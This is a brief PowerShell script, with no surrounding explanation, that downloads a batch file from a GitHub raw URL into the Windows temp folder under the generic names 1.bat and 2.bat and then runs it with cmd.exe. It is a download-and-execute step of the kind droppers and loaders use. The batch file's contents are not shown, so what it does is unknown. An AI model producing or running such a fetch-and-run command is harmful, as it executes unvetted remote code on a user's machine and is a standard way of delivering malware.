$temp = $env:temp

wget https://raw.githubusercontent.com/duchessacid/CG_labs/master/batchfile.bat -OutFile $temp\1.bat
curl https://raw.githubusercontent.com/duchessacid/CG_labs/master/batchfile.bat -OutFile $temp\2.bat
cmd.exe /c $temp\1.bat
